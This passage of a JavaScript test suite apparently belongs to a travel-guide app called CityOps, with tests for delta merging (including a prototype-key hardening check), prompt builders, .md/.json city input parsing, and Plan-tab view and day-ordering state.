  assert.equal(r.summary.intelApplied, 2);
  assert.equal(r.summary.intelSkipped, 1);
  const br = r.data.items.find((it) => it.id === 'brasserie');
  assert.deepEqual(br.intel, { verdicts: [{ tier: 'must', text: 'The khachapuri' }], source: 'Reviews' });
  assert.equal(r.data.items.some((it) => it.id === 'ghost'), false);
});

test('mergeDelta treats a __proto__ intel key as an unknown id, never as a prototype write', () => {
  const d = clone(DELTA);
  // Parsed, not a literal: an object literal's `__proto__` key sets the
  // prototype instead of creating an own property, which would hide the bug
  // this test exists to catch. JSON.parse is also how a real delta arrives.
  d.intel = JSON.parse('{"__proto__": {"verdicts":[{"tier":"must","text":"x"}]}}');
  const r = C.mergeDelta(GOOD, d);
  assert.deepEqual(r.errors, []);
  assert.equal(r.summary.intelSkipped, 1);
  assert.equal(r.summary.intelApplied, 0);
  assert.equal(({}).intel, undefined);
});

test('mergeDelta rejects a delta item whose section is "toString", a prototype method name', () => {
  const d = { schema: 1, delta: true,
    items: [{ id: 'x', section: 'toString', status: 'plan', name: 'X', links: [] }] };
  const r = C.mergeDelta(GOOD, d);
  assert.equal(r.data, null);
  assert.ok(r.errors.some((e) => /unknown section "toString"/.test(e)));
});

test('validate accepts an item id of "valueOf" without a spurious duplicate error', () => {
  const g = clone(GOOD);
  g.items[0].id = 'valueOf';
  assert.deepEqual(C.validate(g), []);
});

test('mergeDelta replaces an existing intel block whole rather than merging into it', () => {
  const base = clone(GOOD);
  base.items[0].intel = { verdicts: [{ tier: 'good', text: 'Old verdict' }], tips: ['Old tip'] };
  const r = C.mergeDelta(base, {
    schema: 1, delta: true, intel: { brasserie: { tips: ['New tip'] } }
  });
  assert.deepEqual(r.data.items[0].intel, { tips: ['New tip'] });
});

test('mergeDelta reaches items the same delta just added', () => {
  const r = C.mergeDelta(GOOD, {
    schema: 1, delta: true,
    items: [{ id: 'fresh', section: 'dinner', status: 'plan', name: 'Fresh', links: [] }],
    intel: { fresh: { tips: ['Book ahead'] } }
  });
  assert.deepEqual(r.errors, []);
  assert.equal(r.summary.intelApplied, 1);
  assert.deepEqual(r.data.items.find((it) => it.id === 'fresh').intel, { tips: ['Book ahead'] });
});

test('mergeDelta never mutates either input', () => {
  const city = clone(GOOD);
  const delta = clone(DELTA);
  const citySnap = JSON.stringify(city);
  const deltaSnap = JSON.stringify(delta);
  const r = C.mergeDelta(city, delta);
  assert.equal(JSON.stringify(city), citySnap);
  assert.equal(JSON.stringify(delta), deltaSnap);
  // And the result is a deep clone, not a view onto either input.
  r.data.items[0].name = 'Mutated';
  r.data.sections[2].label = 'Mutated';
  assert.equal(JSON.stringify(city), citySnap);
  assert.equal(JSON.stringify(delta), deltaSnap);
});

test('mergeDelta never touches city, dates or any other field of an existing item', () => {
  const d = clone(DELTA);
  d.city = { name: 'Hijack', dates: { from: '1999-01-01', to: '1999-01-02' } };
  d.items[0].day = '2026-08-11';
  const r = C.mergeDelta(GOOD, d);
  assert.deepEqual(r.data.city, GOOD.city);
  assert.deepEqual(r.data.city.dates, { from: '2026-08-08', to: '2026-08-15' });
  GOOD.items.forEach((before, i) => {
    const after = clone(r.data.items[i]);
    if (before.id === 'brasserie') delete after.intel;   // the one permitted change
    assert.deepEqual(after, before);
  });
});

test('mergeDelta output passes validate() and round trips through buildExport', () => {
  const r = C.mergeDelta(GOOD, clone(DELTA));
  assert.deepEqual(C.validate(r.data), []);
  const st = C.emptyState();
  const out = C.buildExport(r.data, st);
  assert.deepEqual(C.validate(out), []);
  assert.deepEqual(JSON.parse(JSON.stringify(out)), out);
  const brasserie = out.items.find((it) => it.id === 'brasserie');
  assert.deepEqual(brasserie.intel, DELTA.intel.brasserie);
  assert.ok(out.items.find((it) => it.id === 'boulder'));
  assert.ok(out.sections.find((s) => s.id === 'interests'));
});

test('mergeDelta reads no state: the same call answers identically with no storage at all', () => {
  const src = C.mergeDelta.toString();
  assert.equal(/localStorage|makeStore|liveState|ctx\./.test(src), false);
  const a = C.mergeDelta(GOOD, clone(DELTA));
  const b = C.mergeDelta(GOOD, clone(DELTA));
  assert.deepEqual(a.data, b.data);
  assert.deepEqual(a.summary, b.summary);
});

// ---- Task 3: delta prompt builders ----

const FAKE_RERUN = [
  '# CityOps generation prompt',
  '',
  '### Intel',
  '',
  '<' + '!-- RULES:INTEL -->',
  '- **Restaurants and cafes:** name 2 to 4 specific dishes.',
  '- **Always a source line.**',
  '<' + '!-- /RULES:INTEL -->',
  '',
  '## Output contract',
  '',
  '- `city.dates.from` and `city.dates.to` match the trip dates given above.',
  '',
  '<' + '!-- CONTRACT:ITEM -->',
  '- Every item has `"place_id": null` and `"verified": null`.',
  '- Every item has a unique `id`, a `name`, and a `links` array.',
  '<' + '!-- /CONTRACT:ITEM -->',
  '',
  '## Re-run prompts',
  '',
  '<' + '!-- RERUN:INTERESTS -->',
  'Research this city for the traveler interests listed above.',
  '<' + '!-- /RERUN:INTERESTS -->',
  '',
  '<' + '!-- RERUN:INTEL -->',
  'Research the items listed below, by id.',
  '<' + '!-- /RERUN:INTEL -->',
  '',
  '<' + '!-- RERUN:RATINGS -->',
  'Look up the CURRENT Google Maps rating for each item listed below.',
  '<' + '!-- /RERUN:RATINGS -->',
  '',
  '<' + '!-- RERUN:PLACE -->',
  'Research the ONE place named above and rank it against the section list below.',
  '<' + '!-- /RERUN:PLACE -->'
].join('\n');

const PROFILE = { interests: ['climbing gyms', 'live jazz'], avoid: ['nightclubs'], notes: 'Vegetarian most days.' };

test('buildInterestsDeltaPrompt carries the header, city, profile, re-run block, item list and item shape', () => {
  const out = C.promptKit.buildInterestsDeltaPrompt(FAKE_RERUN, GOOD, PROFILE);
  assert.ok(out.startsWith('You are extending an existing CityOps city guide.'));
  assert.ok(out.includes('- **City:** Batumi'));
  assert.ok(out.includes('- **Country:** GE'));
  assert.ok(out.includes('- **Dates:** 2026-08-08 to 2026-08-15'));
  assert.ok(out.includes('- **Accommodation:** Example Stay D2'));
  // Profile block, same formatter as buildCityPrompt, minus the whole-guide lead.
  assert.ok(out.includes('## Traveler interests'));
  assert.ok(out.includes('- climbing gyms'));
  assert.ok(out.includes('- nightclubs'));
  assert.ok(out.includes('Notes: Vegetarian most days.'));
  assert.equal(out.indexOf('Add a ninth section for these interests'), -1);
  // The landmark block, verbatim and without its landmarks.
  assert.ok(out.includes('Research this city for the traveler interests listed above.'));
  assert.equal(out.indexOf('RERUN:INTERESTS'), -1);
  // Item list, one line per item, after the re-run block that calls it "below".
  assert.ok(out.includes('## Existing items (do not re-suggest these)'));
  assert.ok(out.includes('- brasserie | dinner | Brasserie 1900'));
  assert.ok(out.includes('- nord | coffee | Nord Specialty Coffee'));
  assert.ok(out.indexOf('Research this city for the traveler interests') < out.indexOf('- brasserie | dinner'));
  // Item shape, and NOT the whole-guide contract a delta must never satisfy.
  assert.ok(out.includes('- Every item has a unique `id`, a `name`, and a `links` array.'));
  assert.equal(out.indexOf('match the trip dates given above'), -1);
});

test('buildIntelPassPrompt carries the rules above the instructions and lists every unarchived item', () => {
  const city = clone(GOOD);
  city.items.push({ id: 'gone', section: 'dinner', status: 'archived', name: 'Closed Place', links: [] });
  const out = C.promptKit.buildIntelPassPrompt(FAKE_RERUN, city);
  assert.ok(out.startsWith('You are adding review-verified intel to an existing CityOps city guide.'));
  assert.ok(out.includes('- **City:** Batumi'));
  assert.ok(out.includes('## Intel quality rules'));
  assert.ok(out.includes('- **Restaurants and cafes:** name 2 to 4 specific dishes.'));
  assert.ok(out.includes('Research the items listed below, by id.'));
  // "Follow the Intel quality rules above" only reads correctly in this order.
  assert.ok(out.indexOf('- **Always a source line.**') < out.indexOf('Research the items listed below'));
  assert.ok(out.includes('## Items'));
  assert.ok(out.includes('- brasserie | dinner | Brasserie 1900'));
  assert.ok(out.includes('- sisters | dinner | At the Sisters'));
  assert.equal(out.indexOf('- gone | dinner | Closed Place'), -1);
  assert.ok(out.includes('Cover as many of these as you can verify from real reviews.'));
  assert.equal(out.indexOf('RULES:INTEL'), -1);
  // No profile anywhere: an intel pass is about what is already in the guide.
  assert.equal(out.indexOf('## Traveler interests'), -1);
});

test('the delta builders throw a clear error when a landmark is missing', () => {
  assert.throws(() => C.promptKit.buildInterestsDeltaPrompt('# nothing here', GOOD, PROFILE),
    /no RERUN:INTERESTS block/);
  assert.throws(() => C.promptKit.buildIntelPassPrompt('# nothing here', GOOD),
    /no RULES:INTEL block/);
  const noContract = FAKE_RERUN.split('\n').filter((l) => l.indexOf('CONTRACT:ITEM') === -1).join('\n');
  assert.throws(() => C.promptKit.buildInterestsDeltaPrompt(noContract, GOOD, PROFILE),
    /no CONTRACT:ITEM block/);
  assert.throws(() => C.promptKit.buildIntelPassPrompt(null, GOOD), /no RULES:INTEL block/);
});

test('the delta builders never mutate their inputs and tolerate a bare city', () => {
  const city = clone(GOOD);
  const snap = JSON.stringify(city);
  const p = clone(PROFILE);
  C.promptKit.buildInterestsDeltaPrompt(FAKE_RERUN, city, p);
  C.promptKit.buildIntelPassPrompt(FAKE_RERUN, city);
  assert.equal(JSON.stringify(city), snap);
  assert.deepEqual(p, PROFILE);
  // A city with no items and no optional header fields still builds.
  const bare = { schema: 1, city: { name: 'Tirana', dates: { from: '2026-09-01', to: '2026-09-08' } }, sections: [], items: [] };
  const out = C.promptKit.buildIntelPassPrompt(FAKE_RERUN, bare);
  assert.ok(out.includes('- **City:** Tirana'));
  assert.equal(out.indexOf('- **Country:**'), -1);
  assert.equal(out.indexOf('- **Accommodation:**'), -1);
});

test('the real PROMPT.md carries every landmark the builders slice', () => {
  const fs = require('fs');
  const path = require('path');
  const prompt = fs.readFileSync(path.join(__dirname, '..', 'PROMPT.md'), 'utf8');
  ['RULES:INTEL', 'CONTRACT:ITEM', 'RERUN:INTERESTS', 'RERUN:INTEL', 'RERUN:RATINGS',
    'RERUN:PLACE'].forEach((name) => {
    assert.ok(prompt.indexOf('<' + '!-- ' + name + ' -->') !== -1, 'missing open ' + name);
    assert.ok(prompt.indexOf('<' + '!-- /' + name + ' -->') !== -1, 'missing close ' + name);
  });
  const interests = C.promptKit.buildInterestsDeltaPrompt(prompt, GOOD, PROFILE);
  assert.ok(interests.includes('Never return an item whose id is already in the list below'));
  assert.ok(interests.includes('- brasserie | dinner | Brasserie 1900'));
  const intel = C.promptKit.buildIntelPassPrompt(prompt, GOOD);
  assert.ok(intel.includes('Follow the Intel quality rules above exactly'));
  assert.ok(intel.includes('**Omit `intel` entirely rather than pad it.**'));
  assert.ok(intel.includes('- nord | coffee | Nord Specialty Coffee'));
});

// md ingestion: tools/city-input.js is what embed.js uses to accept either
// cities/<city>.json or a .md handoff from an AI chat (chats often wrap the
// same JSON in a fenced code block instead of returning raw .json).
test('readCityInput: .md with a fenced json block extracts and validates', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const { readCityInput } = require('../tools/city-input');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cityops-test-'));
  const mdPath = path.join(dir, 'batumi.md');
  fs.writeFileSync(mdPath,
    'Here is the guide:\n\n```json\n' + JSON.stringify(GOOD) + '\n```\n');
  const res = readCityInput(mdPath);
  assert.equal(res.data.city.name, 'Batumi');
  assert.equal(res.mdSourcePath, mdPath);
  assert.deepEqual(JSON.parse(res.json), GOOD);
  fs.rmSync(dir, { recursive: true });
});
test('readCityInput: .md with no fenced block fails with a retry instruction', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const { readCityInput } = require('../tools/city-input');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cityops-test-'));
  const mdPath = path.join(dir, 'batumi.md');
  fs.writeFileSync(mdPath, '# Batumi guide\n\nSorry, ran out of room, ask me for the JSON separately.\n');
  assert.throws(() => readCityInput(mdPath), /json code block/);
  assert.throws(() => readCityInput(mdPath), /reply with the full city guide as a single/);
  fs.rmSync(dir, { recursive: true });
});
test('readCityInput: plain .json is unchanged (no md extraction, no file written)', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const { readCityInput } = require('../tools/city-input');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cityops-test-'));
  const jsonPath = path.join(dir, 'batumi.json');
  fs.writeFileSync(jsonPath, JSON.stringify(GOOD));
  const res = readCityInput(jsonPath);
  assert.equal(res.mdSourcePath, null);
  assert.deepEqual(res.data, GOOD);
  assert.deepEqual(fs.readdirSync(dir), ['batumi.json']); // no extra file for a .json input
  fs.rmSync(dir, { recursive: true });
});
test('readCityInput: schema violations fail with the same errors validate() reports', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const { readCityInput } = require('../tools/city-input');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cityops-test-'));
  const mdPath = path.join(dir, 'batumi.md');
  const bad = clone(GOOD);
  bad.schema = 2;
  fs.writeFileSync(mdPath, '```json\n' + JSON.stringify(bad) + '\n```\n');
  assert.throws(() => readCityInput(mdPath), /schema must be 1/);
  fs.rmSync(dir, { recursive: true });
});
test('writeCanonicalJson writes cities/<city>.json next to the .md source', () => {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const { readCityInput, writeCanonicalJson } = require('../tools/city-input');
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cityops-test-'));
  const mdPath = path.join(dir, 'batumi.md');
  fs.writeFileSync(mdPath, '```json\n' + JSON.stringify(GOOD) + '\n```\n');
  const res = readCityInput(mdPath);
  const written = writeCanonicalJson(res.mdSourcePath, res.json);
  assert.equal(written, path.join(dir, 'batumi.json'));
  assert.deepEqual(JSON.parse(fs.readFileSync(written, 'utf8')), GOOD);
  fs.rmSync(dir, { recursive: true });
});

// ---- Phase 3: compact cards, section defaults, Today view, icon controls ----

test('emptyState has an unset viewMode; normalizeState preserves "never chosen"', () => {
  assert.equal(C.emptyState().viewMode, null);
  assert.equal(C.normalizeState({ itemStatus: {} }).viewMode, null); // key absent entirely
  assert.equal(C.normalizeState({ itemStatus: {}, viewMode: null }).viewMode, null); // sentinel round-trips
});
test('setViewMode accepts today, type and day; rejects anything else', () => {
  const st = C.emptyState();
  C.setViewMode(st, 'today');
  assert.equal(st.viewMode, 'today');
  C.setViewMode(st, 'day');
  assert.equal(st.viewMode, 'day');
  assert.throws(() => C.setViewMode(st, 'week'));
});
test('effectiveViewMode: Today inside the stay, Guide outside it, unless already chosen', () => {
  const st = C.emptyState();
  assert.equal(C.effectiveViewMode(GOOD, st, '2026-08-10'), 'today'); // inside 08-08..08-15
  assert.equal(C.effectiveViewMode(GOOD, st, '2026-09-01'), 'type');  // outside the stay
  C.setViewMode(st, 'day');
  assert.equal(C.effectiveViewMode(GOOD, st, '2026-08-10'), 'day'); // an explicit choice always wins
});
test('toggleSection: sections default collapsed only past ~30 items; base is the one exception', () => {
  const st = C.emptyState();
  assert.equal(C.isSectionCollapsed(st, 'dinner', 10), false); // small guide: open by default
  assert.equal(C.isSectionCollapsed(st, 'dinner', 40), true);  // large guide: collapsed by default
  assert.equal(C.isSectionCollapsed(st, 'base', 40), false);   // base never auto-collapses
  C.toggleSection(st, 'dinner', 40);                           // opens it: explicit override
  assert.equal(C.isSectionCollapsed(st, 'dinner', 40), false);
  assert.equal(st.collapsedSections.dinner, false);
  C.toggleSection(st, 'dinner', 40);                           // back to the (collapsed) default
  assert.ok(!('dinner' in st.collapsedSections));               // override dropped, not just flipped
  assert.equal(C.isSectionCollapsed(st, 'dinner', 40), true);
});
test('todayModel groups items dated today; GOOD has no tasks section so tasks stays empty', () => {
  const st = C.emptyState();
  const tm = C.todayModel(GOOD, st, '2026-08-10');
  assert.equal(tm.todayIso, '2026-08-10');
  assert.equal(tm.inRange, true);
  assert.deepEqual(tm.today.map(e => e.it.id), ['tanini']); // dinner item dated 08-10
  // nord (coffee, undated, status plan) is NOT a task: coffee is a normal
  // recommendation section, not a to-do list, so it must not show up here.
  assert.deepEqual(tm.tasks, []);
  assert.deepEqual(tm.upNext, []); // nothing dated 08-11 in GOOD
});
test('todayModel previews tomorrow\'s itinerary item as upNext', () => {
  const st = C.emptyState();
  const tm = C.todayModel(GOOD, st, '2026-08-12'); // tomorrow = 08-13, brasserie's day
  assert.deepEqual(tm.upNext.map(e => e.it.id), ['brasserie']);
  assert.deepEqual(tm.today, []); // nothing dated 08-12
});
test('todayModel: inRange is false outside the stay', () => {
  const st = C.emptyState();
  const tm = C.todayModel(GOOD, st, '2026-09-01');
  assert.equal(tm.inRange, false);
});
test('todayModel never surfaces backup or archived items in the today bucket', () => {
  const st = C.emptyState();
  C.setStatus(st, 'sisters', 'plan'); // would otherwise land in dinner's day slots
  const tm = C.todayModel(GOOD, st, '2026-08-10');
  assert.equal(tm.today.some(e => e.it.id === 'sisters'), false); // still undated, not on today
});
// A dedicated fixture with a real tasks section (Tirana's actual convention:
// id "tasks", label "Open items"), since GOOD has no such section.
const WITH_TASKS = clone(GOOD);
WITH_TASKS.sections.push({ id: 'tasks', label: 'Open items', icon: '☑' });
WITH_TASKS.items.push(
  { id: 'buy-adapter', section: 'tasks', status: 'plan', name: 'Buy a plug adapter', links: [], place_id: null, verified: null },
  { id: 'book-train', section: 'tasks', status: 'plan', name: 'Book the overnight train', links: [], place_id: null, verified: null },
  { id: 'old-errand', section: 'tasks', status: 'done', name: 'Already handled', links: [], place_id: null, verified: null }
);
test('todayModel surfaces undated, open items from a guide\'s tasks section', () => {
  const st = C.emptyState();
  const tm = C.todayModel(WITH_TASKS, st, '2026-08-10');
  assert.deepEqual(tm.tasks.map(e => e.it.id).sort(), ['book-train', 'buy-adapter']);
  // nord (coffee) still never counts as a task, even alongside a real one.
  assert.ok(!tm.tasks.some(e => e.it.id === 'nord'));
});
test('isTaskSection matches by id "tasks" or a "task" label, not any arbitrary section', () => {
  assert.equal(C.isTaskSection({ id: 'tasks', label: 'Open items' }), true);
  assert.equal(C.isTaskSection({ id: 'errands', label: 'To-do / tasks' }), true);
  assert.equal(C.isTaskSection({ id: 'coffee', label: 'Coffee' }), false);
  assert.equal(C.isTaskSection(null), false);
});
test('TRANSITIONS keeps the same to-state semantics under icon-only presentation', () => {
  assert.deepEqual(C.TRANSITIONS.plan.map(t => t.to), ['done', 'backup', 'archived']);
  assert.deepEqual(C.TRANSITIONS.backup.map(t => t.to), ['plan', 'archived']);
  assert.deepEqual(C.TRANSITIONS.done.map(t => t.to), ['plan']);
  assert.deepEqual(C.TRANSITIONS.archived.map(t => t.to), ['backup']);
  // Archive is the one destructive transition that keeps a visible text label.
  assert.equal(C.TRANSITIONS.plan.find(t => t.to === 'archived').label, 'Archive');
  assert.equal(C.TRANSITIONS.plan.find(t => t.to === 'done').label, undefined);
  assert.ok(C.TRANSITIONS.plan.every(t => typeof t.aria === 'string' && t.aria.length));
});

// ---- Phase 4: tabs (Plan / Eat & Drink / Do / Services / Info) ----
test('TABS is the five fixed tabs, in nav order', () => {
  assert.deepEqual(C.TABS.map(t => t.id), ['plan', 'eat', 'do', 'services', 'info']);
  assert.deepEqual(C.TABS.map(t => t.label), ['Plan', 'Eat & Drink', 'Do', 'Services', 'Info']);
});
test('tabForSection maps the PROMPT.md schema sections', () => {
  assert.equal(C.tabForSection({ id: 'dinner', label: 'Dinner' }), 'eat');
  assert.equal(C.tabForSection({ id: 'breakfast', label: 'Breakfast' }), 'eat');
  assert.equal(C.tabForSection({ id: 'lunch', label: 'Lunch' }), 'eat');
  assert.equal(C.tabForSection({ id: 'coffee', label: 'Coffee' }), 'eat');
  assert.equal(C.tabForSection({ id: 'cowork', label: 'Coworking' }), 'eat'); // a work cafe is an eat-drink venue
  assert.equal(C.tabForSection({ id: 'activities', label: 'Activities' }), 'do');
  assert.equal(C.tabForSection({ id: 'interests', label: 'My interests' }), 'do');
  assert.equal(C.tabForSection({ id: 'services', label: 'Services' }), 'services');
  assert.equal(C.tabForSection({ id: 'practical', label: 'Practical' }), 'info');
});
test('tabForSection maps Tirana\'s real freeform sections', () => {
  assert.equal(C.tabForSection({ id: 'base', label: 'Base' }), 'info');
  assert.equal(C.tabForSection({ id: 'money', label: 'Cash & currency' }), 'info');
  assert.equal(C.tabForSection({ id: 'transport', label: 'Transport' }), 'info');
  assert.equal(C.tabForSection({ id: 'restaurants', label: 'Restaurants' }), 'eat');
  assert.equal(C.tabForSection({ id: 'bars', label: 'Bars' }), 'eat');
  assert.equal(C.tabForSection({ id: 'laundry', label: 'Laundry' }), 'services');
  assert.equal(C.tabForSection({ id: 'logistics', label: 'Logistics' }), 'info');
  assert.equal(C.tabForSection({ id: 'context', label: 'Context' }), 'info');
  assert.equal(C.tabForSection({ id: 'corrections', label: 'Corrections' }), 'info');
});
test('tabForSection: known info ids win over the services keyword fallback (real collision)', () => {
  // Tirana's real "safety" section is labeled "Health & safety". A naive
  // keyword match on "health" would misfile it as a services listing;
  // explicit info ids must be checked first.
  assert.equal(C.tabForSection({ id: 'safety', label: 'Health & safety' }), 'info');
});
test('tabForSection: itinerary and any tasks section route to Plan', () => {
  assert.equal(C.tabForSection({ id: 'itinerary', label: 'Daily plan' }), 'plan');
  assert.equal(C.tabForSection({ id: 'tasks', label: 'Open items' }), 'plan');
  assert.equal(C.tabForSection({ id: 'errands', label: 'To-do / tasks' }), 'plan');
});
test('tabForSection: an unrecognized section falls back to Info', () => {
  assert.equal(C.tabForSection({ id: 'weather', label: 'Weather notes' }), 'info');
  assert.equal(C.tabForSection(null), 'info');
});
test('tabForSection: the services keyword fallback only fires for ids it does not already know', () => {
  // Not one of the explicit ids anywhere: caught by the keyword match instead.
  assert.equal(C.tabForSection({ id: 'barber-shops', label: 'Barbers' }), 'services');
  assert.equal(C.tabForSection({ id: 'misc', label: 'Massage parlors' }), 'services');
});
test('setTab validates against the five ids; effectiveTab defaults to plan', () => {
  const st = C.emptyState();
  assert.equal(C.effectiveTab(st), 'plan'); // never chosen
  C.setTab(st, 'eat');
  assert.equal(st.tab, 'eat');
  assert.equal(C.effectiveTab(st), 'eat');
  assert.throws(() => C.setTab(st, 'guide')); // not one of the five tabs
});
test('normalizeState defaults tab to null (never chosen) and corrects a bogus stored value to plan', () => {
  assert.equal(C.normalizeState({ itemStatus: {} }).tab, null); // key absent entirely
  assert.equal(C.normalizeState({ itemStatus: {}, tab: null }).tab, null); // sentinel round-trips
  assert.equal(C.normalizeState({ itemStatus: {}, tab: 'guide' }).tab, 'plan'); // stray value corrected
  assert.equal(C.normalizeState({ itemStatus: {}, tab: 'services' }).tab, 'services');
  assert.deepEqual(C.emptyState().collapsedPlanDays, {});
});
test('isPlanDayCollapsed/togglePlanDay: every remaining day starts expanded; toggling twice clears the override', () => {
  const st = C.emptyState();
  assert.equal(C.isPlanDayCollapsed(st, '2026-08-11'), false);
  C.togglePlanDay(st, '2026-08-11');
  assert.equal(C.isPlanDayCollapsed(st, '2026-08-11'), true);
  assert.equal(st.collapsedPlanDays['2026-08-11'], true);
  C.togglePlanDay(st, '2026-08-11');
  assert.equal(C.isPlanDayCollapsed(st, '2026-08-11'), false);
  assert.ok(!('2026-08-11' in st.collapsedPlanDays)); // override dropped, not just flipped
});
test('planModel: today groups every dated-today item across sections, same as todayModel', () => {
  const st = C.emptyState();
  const pm = C.planModel(GOOD, st, '2026-08-10');
  assert.equal(pm.todayIso, '2026-08-10');
  assert.equal(pm.inRange, true);
  assert.deepEqual(pm.today.map(e => e.it.id), ['tanini']);
});
test('planModel: every other day of the stay in order, excluding today, empty days included', () => {
  const st = C.emptyState();
  const pm = C.planModel(GOOD, st, '2026-08-10');
  assert.deepEqual(pm.days.map(d => d.iso),
    ['2026-08-08', '2026-08-09', '2026-08-11', '2026-08-12', '2026-08-13', '2026-08-14', '2026-08-15']);
  assert.deepEqual(pm.days.find(d => d.iso === '2026-08-13').items.map(e => e.it.id), ['brasserie']);
  assert.deepEqual(pm.days.find(d => d.iso === '2026-08-09').items, []); // nothing assigned: an empty day, not omitted
});
test('planModel: an item day-assigned from an Eat & Drink section still surfaces here (cross-tab)', () => {
  const st = C.emptyState();
  C.setDay(st, 'nord', '2026-08-09'); // nord is a coffee (Eat & Drink) item
  const pm = C.planModel(GOOD, st, '2026-08-10');
  assert.deepEqual(pm.days.find(d => d.iso === '2026-08-09').items.map(e => e.it.id), ['nord']);
});
test('planModel: open vs done tasks split, undated only (a dated task shows under its day instead)', () => {
  const st = C.emptyState();
  C.setStatus(st, 'old-errand', 'done'); // already done in the fixture's own data too
  const pm = C.planModel(WITH_TASKS, st, '2026-08-10');
  assert.deepEqual(pm.openTasks.map(e => e.it.id).sort(), ['book-train', 'buy-adapter']);
  assert.deepEqual(pm.doneTasks.map(e => e.it.id), ['old-errand']);
});
test('planModel: a dated task item shows in its day, not in openTasks (no double-count)', () => {
  const st = C.emptyState();
  C.setDay(st, 'buy-adapter', '2026-08-09');
  const pm = C.planModel(WITH_TASKS, st, '2026-08-10');
  assert.ok(!pm.openTasks.some(e => e.it.id === 'buy-adapter'));
  assert.deepEqual(pm.days.find(d => d.iso === '2026-08-09').items.map(e => e.it.id), ['buy-adapter']);
});

// ---- Plan tab: drag to reorder items inside a day (dayItemOrder) ----
function entry(id) { return { sec: { id: 's' }, it: { id: id }, status: 'plan' }; }

test('orderDayItems: no saved order leaves the day in its default order', () => {
  const day = [entry('a'), entry('b'), entry('c')];
  assert.deepEqual(C.orderDayItems(day, []).map(e => e.it.id), ['a', 'b', 'c']);
  assert.deepEqual(C.orderDayItems(day, null).map(e => e.it.id), ['a', 'b', 'c']);
});
test('orderDayItems: a saved order rearranges the day', () => {
  const day = [entry('a'), entry('b'), entry('c')];
  assert.deepEqual(C.orderDayItems(day, ['c', 'a', 'b']).map(e => e.it.id), ['c', 'a', 'b']);
});
test('orderDayItems: ids no longer on this day are ignored, not fatal', () => {
  const day = [entry('a'), entry('b')];
  assert.deepEqual(C.orderDayItems(day, ['gone', 'b', 'also-gone', 'a']).map(e => e.it.id), ['b', 'a']);
});
test('orderDayItems: an item the saved order never heard of keeps its default place at the end', () => {
  const day = [entry('a'), entry('b'), entry('new')];
  assert.deepEqual(C.orderDayItems(day, ['b', 'a']).map(e => e.it.id), ['b', 'a', 'new']);
});
test('orderDayItems: a duplicated id in the saved order places the item once', () => {
  const day = [entry('a'), entry('b')];
  assert.deepEqual(C.orderDayItems(day, ['b', 'b', 'a']).map(e => e.it.id), ['b', 'a']);
});
test('orderDayItems does not mutate the entries it is given', () => {
  const day = [entry('a'), entry('b')];
  C.orderDayItems(day, ['b', 'a']);
  assert.deepEqual(day.map(e => e.it.id), ['a', 'b']);
});
test('setDayItemOrder stores an arrangement, dedupes it, and drops an empty one', () => {
  const st = C.emptyState();
  C.setDayItemOrder(st, '2026-08-13', ['nord', 'brasserie', 'nord', '', null]);
  assert.deepEqual(st.dayItemOrder['2026-08-13'], ['nord', 'brasserie']);
  C.setDayItemOrder(st, '2026-08-13', []);
  assert.ok(!('2026-08-13' in st.dayItemOrder)); // back to the guide's own order
  assert.throws(() => C.setDayItemOrder(st, 'Thursday', ['nord']), /bad day/);
});
test('emptyState carries dayItemOrder and normalizeState backfills it for older saved state', () => {
  assert.deepEqual(C.emptyState().dayItemOrder, {});
  const old = C.normalizeState({ itemStatus: {}, itemDay: {}, dayOrder: {} }); // pre-feature state
  assert.deepEqual(old.dayItemOrder, {});
  const kept = C.normalizeState({ itemStatus: {}, dayItemOrder: { '2026-08-13': ['nord'] } });
  assert.deepEqual(kept.dayItemOrder['2026-08-13'], ['nord']);
});
test('planModel: a day reads its saved within-day order, across sections', () => {
  const st = C.emptyState();
  C.setDay(st, 'nord', '2026-08-13'); // coffee item joins the dinner item already there
  const before = C.planModel(GOOD, st, '2026-08-10');
  assert.deepEqual(before.days.find(d => d.iso === '2026-08-13').items.map(e => e.it.id),
    ['brasserie', 'nord']); // default: section order, then guide order
  C.setDayItemOrder(st, '2026-08-13', ['nord', 'brasserie']);
  const after = C.planModel(GOOD, st, '2026-08-10');
  assert.deepEqual(after.days.find(d => d.iso === '2026-08-13').items.map(e => e.it.id),
    ['nord', 'brasserie']);
});
test('planModel: today honors its own within-day order too', () => {
  const st = C.emptyState();
  C.setDay(st, 'nord', '2026-08-10'); // tanini is already on this date
  assert.deepEqual(C.planModel(GOOD, st, '2026-08-10').today.map(e => e.it.id), ['tanini', 'nord']);
  C.setDayItemOrder(st, '2026-08-10', ['nord', 'tanini']);
  assert.deepEqual(C.planModel(GOOD, st, '2026-08-10').today.map(e => e.it.id), ['nord', 'tanini']);
});
test('planModel: an arrangement whose item moved away still orders the rest', () => {
  const st = C.emptyState();
  C.setDay(st, 'nord', '2026-08-13');
  C.setDayItemOrder(st, '2026-08-13', ['nord', 'brasserie']);
  C.setDay(st, 'nord', '2026-08-14'); // dragged off to the next day
  const pm = C.planModel(GOOD, st, '2026-08-10');
  assert.deepEqual(pm.days.find(d => d.iso === '2026-08-13').items.map(e => e.it.id), ['brasserie']);
  assert.deepEqual(pm.days.find(d => d.iso === '2026-08-14').items.map(e => e.it.id), ['nord']);
});
// The export decision, as a test: a within-day arrangement is device/sync
// state, not guide data. See the comment above buildExport for why array
// position cannot carry it (the item array is section-major).
test('buildExport ignores dayItemOrder, and the round trip stays lossless with one saved', () => {
  const st = C.emptyState();
  C.setDay(st, 'nord', '2026-08-13');
  const plain = C.buildExport(GOOD, st);
  C.setDayItemOrder(st, '2026-08-13', ['nord', 'brasserie']);
  const arranged = C.buildExport(GOOD, st);
  assert.deepEqual(arranged, plain);
  const again = C.buildExport(C.parse(JSON.stringify(arranged)).data, C.emptyState());
  assert.deepEqual(again, arranged);
});

// QA follow-up: an integration guard against the real Tirana dataset (the
// freeform-schema fixture the tab mapping has to handle), so a future
// section id added to that guide can never silently orphan into no tab at
// all. tabForSection() always returns a string default ('info'), so the
